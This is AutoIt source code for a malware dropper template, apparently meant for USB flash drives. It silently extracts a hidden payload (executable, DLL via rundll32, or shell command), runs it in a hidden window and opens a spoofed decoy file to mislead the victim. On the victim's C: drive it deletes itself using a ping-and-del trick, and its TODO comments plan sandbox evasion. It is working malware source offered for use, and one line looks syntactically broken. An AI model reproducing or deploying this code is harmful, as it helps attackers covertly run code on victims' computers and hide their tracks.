;Payload Template Version: 0.5.0a

;TODO: * Read return values for a fail safe system
;      * Workround sand boxes
;      * Circumvent Flash drive malwares as they can pose a problem with the directories and execution
;      * create a system to bound the payload to only execute on the attackers' flash drive.
;      * Hash some flash drive malware for the circumvention mode

;String Format Placeholder values
; 0  - #RequireAdmin pre-processor
; 1  - Payload arguments placeholder (string)
; 2  - Execute through console (bool)
; 3  - Stream console output to a text file (bool)
; 4  - Execute in victims' drive (bool)
; 5  - Wait for payload to finish (bool)
; 6  - Payload name (string)
; 7  - Spoofed File name (string)
; 8  - Hide/Show Payload Window (Macro | @SW_SHOW / @SW_HIDE)
; 9  - Console command execution switch (String | /k or /c)
; 10 - Type of payload (integer | 0 = payload / 2 = dll payload / 3 = shell code)

#NoTrayIcon
{0} 

Global $arguments = "{1}"
Global $cmd = {2}
Global $cmdstream = {3}
Global $execdrive = {4}
Global $waitpayload = {5}
Global $nmpayload = "{6}"
Global $nmspoof = "{7}"
Global $showwin = {8}
Global $conswitch = "{9}"
Global $payloadtype = {10}
Global $drive = StringLeft(@ScriptDir, 3)
Global $spoofarguments, $payloadtarget, $spooftarget

;Initialization

for $i = 1 to $Cmdline[0]
    $spoofarguments &= " " & $Cmdline[$i]
next

If $drive = "C:\" Then
    extractSpoof(true)
Else
    extractPayload()
EndIf

;Extract Payload Function - Extract and execute the payload
Func extractPayload()
    ;Extract the Payload
    If $execdrive Then
        $payloadtarget = @TempDir & "\" & $nmpayload
    Else
        $payloadtarget = @ScriptDir & "\" & $nmpayload
    EndIf

    If FileExists($payloadtarget) = False Then
        FileInstall("$payloadtmp", $payloadtarget, 1)
        FileSetAttrib($payloadtarget, "+S +H +R")
    EndIf

    ;Execute Payload
    Local $executetarget, $prearguments
    Local $dumptarget = @ScriptDir & '\' & ensureRndNm()

    Switch ($payloadtype)
        Case 0 ;File type payload mode
            If $cmd Then
                $executetarget = "cmd.exe"
                If $cmdstream Then
                    $prearguments = $conswitch & ' "' & $payloadtarget & '" ' & $arguments & ' > ' & $dumptarget & '&attrib "' & $dumptarget  & '" +H'
                Else
                    $prearguments = $conswitch & ' "' & $payloadtarget & '" ' & $arguments
                EndIf
            Else
                $executetarget = $payloadtarget
            EndIf
        Case 1 ;DLL type payload mode
            $executetarget = "rundll32.exe"
            $prearguments = $payloadtarget & ', ' $ $arguments
        Case 2 ;Shell code
            $executetarget = "cmd.exe"
            $prearguments = "/c " & $arguments
    EndSwitch

    ShellExecute($executetarget, $prearguments, "", "", $showwin)
    extractSpoof(false)
EndFunc

;Extract Spoof Function - Extracts the Spoofed file and executes it.
;                       - Disposes the payload.
;-------------------------------------------------------------------
; extractSpoof(bool)
;-------------------------------------------------------------------
; * true - After execution of the spoofed file, dispose the payload.
; * false - After execution of the spoofed file, exit.
; * returns: nothing
Func extractSpoof($disp = false)
    $spooftarget = @ScriptDir & "\" & $nmspoof
    ;Extract the Spoofed File
    If FileExists($nmspoof) = False Then
        FileInstall("$spooftmp", $nmspoof, 1)
    EndIf
    ;Execute Spoof
    ShellExecute($spooftarget, $spoofarguments)

    ;Dispose the payload
    If $disp Then
        ShellExecute("cmd.exe", "/c ping 8.8.8.8&del " & @ScriptFullPath, "", "", @SW_HIDE)
        Exit(0)
    EndIf

EndFunc

;Ensure Random Name Function - Generates a random .madmp file name while ensuring said file doesn't exist.
;---------------------------------------------------------------------------------------------------------
; * format: DAY-MONTH-YEAR-RANDOM.madmp
; * returns: string
Func ensureRndNm()
    Local $tmpname
    Do
        $tmpname = @MDAY & "-" & @MON & "-" & @YEAR & "-" & Random(100, 999, 1) & ".madmp"
    Until FileExists($tmpname) = False
    return $tmpname
EndFunc